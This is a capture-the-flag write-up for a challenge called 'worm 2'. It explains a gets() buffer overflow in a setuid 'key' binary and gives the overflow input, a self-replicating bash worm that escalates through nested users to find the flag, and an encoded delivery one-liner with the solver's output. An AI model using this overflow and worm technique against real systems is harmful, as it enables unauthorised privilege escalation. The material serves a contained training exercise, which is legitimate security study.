# worm 2

> Note: The original challenge had an unintended solution ?, so this is the  
> patched version

Write a worm and pwn my system :)

```  
nc 35.188.197.160 1002  
```

Attachments: `worm2.zip`

## Overview

After connecting the server, we this:

```  
$ nc 35.188.197.160 1002  
Send the output of: hashcash -mb26 5qB3LV9O/rHt8dQ9  
1:26:210613:5qb3lv9o/rht8dq9::obR0I0xtrnii7Z7N:3fgTk  
warning: commands will be executed using /bin/sh  
job 153 at Sun Jun 13 18:27:00 2021  
Creating network "64d81a00b78f2c0d0e179a8992e2057b_default" with the default
driver  
Creating 64d81a00b78f2c0d0e179a8992e2057b_app_run ...  
Creating 64d81a00b78f2c0d0e179a8992e2057b_app_run ... done  
Adding group `user1' (GID 1000) ...  
Done.  
Adding group `user2' (GID 1001) ...  
Done.  
Adding group `user3' (GID 1002) ...  
Done.  
Adding group `user4' (GID 1003) ...  
Done.  
Adding group `user5' (GID 1004) ...  
Done.  
Adding group `user6' (GID 1005) ...  
Done.  
Adding group `user7' (GID 1006) ...  
Done.  
Adding group `user8' (GID 1007) ...  
Done.  
Adding group `user9' (GID 1008) ...  
Done.  
Adding group `user10' (GID 1009) ...  
Done.  
[*] Compiling key 2 ...  
[*] Done  
[*] Compiling key 3 ...  
[*] Done  
[*] Compiling key 4 ...  
[*] Done  
[*] Compiling key 5 ...  
[*] Done  
[*] Compiling key 6 ...  
[*] Done  
[*] Compiling key 7 ...  
[*] Done  
[*] Compiling key 8 ...  
[*] Done  
[*] Compiling key 9 ...  
[*] Done  
[*] Compiling key 10 ...  
[*] Done  
[*] Building tree with 1023 nodes ...  
[*] Planting flag in a random leaf node ...  
[+] Ready  
[*] You now have a shell!  
[*] Please enter your exploit below (max 512 chars):  
```

On the remote server, we only get to execute one command non-interactively.
You  
can set up the challenge locally to test though:

We start off as `user1` in the root directory.  
If we `cd` to `/room0`, we see:  
```sh  
user1@14f2437dee35:/room0$ ls -lah  
total 36K  
dr-xr-x--- 4 user1 user2 4.0K May 15 01:26 .  
drwxr-xr-x 1 root  root  4.0K May 15 01:26 ..  
-r-sr-x--- 1 user2 user1  17K May 15 01:26 key  
dr-xr-x--- 4 user2 user3 4.0K May 15 01:26 room0  
dr-xr-x--- 4 user2 user3 4.0K May 15 01:26 room1  
```

If we try `cd room0` or `cd room1`, we get `Permission denied`. Luckily, the  
`key` executable is owned by `user2` and has the `setuid` bit set. Running  
`./key`, we get:

```sh  
user1@14f2437dee35:/room0$ ./key  
Name: idk  
Unauthorized :(  
```

Here's the relevant code from `key.c`:  
```c  
typedef struct {  
   char name[32];  
   char password[32];  
} User;

void auth() {  
   printf("Authenticating ...\n");  
   assert(setuid(ID) == 0);  
   assert(setgid(ID) == 0);  
   system("/bin/bash");  
}

int main() {  
   User user;

   printf("Name: ");  
   gets(user.name);

   if (strncmp(user.password, "p4ssw0rd", 8) == 0) {  
       auth();  
   } else {  
       printf("Unauthorized :(\n");  
   }  
return 0;  
}  
```

There's clearly a BOF at `gets(user.name)`, so we can type in 32 characters
and  
overflow into `user.password` to set it to `p4ssw0rd`.

```sh  
user1@14f2437dee35:/room0$ ./key  
Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp4ssw0rd  
Authenticating ...  
user2@14f2437dee35:/room0$ id  
uid=1001(user2) gid=1001(user2) groups=1001(user2),1000(user1)  
```

Now we're `user2` and can `cd` to `room0` or `room1`. In `/room0/room1`, we
see  
nearly the exact same thing:  
```sh  
user2@14f2437dee35:/room0/room1$ ls -lah  
total 36K  
dr-xr-x--- 4 user2 user3 4.0K May 15 01:26 .  
dr-xr-x--- 4 user1 user2 4.0K May 15 01:26 ..  
-r-sr-x--- 1 user3 user2  17K May 15 01:26 key  
dr-xr-x--- 4 user3 user4 4.0K May 15 01:26 room0  
dr-xr-x--- 4 user3 user4 4.0K May 15 01:26 room1  
```

Again if we try to `cd room0` or `cd room1`, we get `Permission denied`, so we  
have to use the `key`.

We know that `MAX_DEPTH = 10` so directory structure forms a full binary tree,  
and the flag is located in a random leaf node.  
```python  
def plant_flag():  
   os.chdir("room0")  
   while len(os.listdir()) > 0:  
       os.chdir(f"room{random.randint(0, 1)}")

   os.rename("/flag.txt", "./flag.txt")  
```

Finally, our entire exploit must be less than 512 characters (external  
networking is disabled so we can't download any additional payloads):  
```bash  
echo "[*] You now have a shell!"  
echo "[*] Please enter your exploit below (max 512 chars):"  
read -n 512 cmd  
exec su user1 -c "$cmd" 0<&-  
```

## Solution

Do depth-first search with a self-replicating exploit:  
```bash  
echo -n . 1>&2

if [ -f "flag.txt" ]; then  
   cat flag.txt 1>&2  
fi

if [ -f "key" ]; then  
   payload=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp4ssw0rd  
   (echo $payload && echo "cd room0 && exec bash /tmp/solve.sh") | ./key > /dev/null  
   (echo $payload && echo "cd room1 && exec bash /tmp/solve.sh") | ./key > /dev/null  
fi  
```

Output:  
```sh  
$ python3 client.py  
[x] Opening connection to localhost on port 1024  
[x] Opening connection to localhost on port 1024: Trying 127.0.0.1  
[+] Opening connection to localhost on port 1024: Done  
[*] Solving PoW ...  
[DEBUG] Received 0x34 bytes:  
   b'Send the output of: hashcash -mb26 ehmCMcCi7SHUqWes\n'  
[+] Solved PoW  
[DEBUG] Sent 0x35 bytes:  
   b'1:26:210515:ehmcmcci7shuqwes::FmB8btNpTIqC54om:2Bd/y\n'  
[DEBUG] Sent 0x150 bytes:  
   b'cd /tmp && echo -n H4sIAAwmn2AC/5WPTQrCMBSE9z3FEKTookkr7sSC5xAXMT+mmCalibUFD2+tCrpSZznvfcOMEsYjc6AoynSZJJXGDpkG0ZYfaewjwX6NaJRLMErwiNflQejqDTqp4fO/4YP1XG62X9SsQrjkrZygubqXmj1ZpCkmgwiJ1vs6n5xeCRx4MGCxbljwtlM0GLLAFZSNPVCCSdUxd7b2l9Ti/9Rx+g33VaPsPwEAAA== | base64 -d > solve.sh.gz && gzip -d solve.sh.gz && cd /room0 && bash /tmp/solve.sh\n'  
[*] Switching to interactive mode  
warning: commands will be executed using /bin/sh  
job 20 at Sat May 15 01:44:00 2021  
Creating network "9a97ccccc44d5152637380a682ac72ea_default" with the default
driver  
Creating 9a97ccccc44d5152637380a682ac72ea_app_run ...  
Creating 9a97ccccc44d5152637380a682ac72ea_app_run ... done  
Adding group `user1' (GID 1000) ...  
Done.  
Adding group `user2' (GID 1001) ...  
Done.  
Adding group `user3' (GID 1002) ...  
Done.  
Adding group `user4' (GID 1003) ...  
Done.  
Adding group `user5' (GID 1004) ...  
Done.  
Adding group `user6' (GID 1005) ...  
Done.  
Adding group `user7' (GID 1006) ...  
Done.  
Adding group `user8' (GID 1007) ...  
Done.  
Adding group `user9' (GID 1008) ...  
Done.  
Adding group `user10' (GID 1009) ...  
Done.  
[*] Compiling key 2 ...  
[*] Done  
[*] Compiling key 3 ...  
[*] Done  
[*] Compiling key 4 ...  
[*] Done  
[*] Compiling key 5 ...  
[*] Done  
[*] Compiling key 6 ...  
[*] Done  
[*] Compiling key 7 ...  
[*] Done  
[*] Compiling key 8 ...  
[*] Done  
[*] Compiling key 9 ...  
[*] Done  
[*] Compiling key 10 ...  
[*] Done  
[*] Building tree with 1023 nodes ...  
[*] Planting flag in a random leaf node ...  
[+] Ready  
[*] You now have a shell!  
[*] Please enter your exploit below (max 512 chars):  
........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................CCC{I_c4nt_b3l1ev3_1_f0rg0t_t0_cl0s3_std1n}  
.......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................[*]
Got EOF while reading in interactive  
```  

Original writeup
(https://github.com/qxxxb/ctf_challenges/blob/master/2021/ccc/pwn/worm2/solve).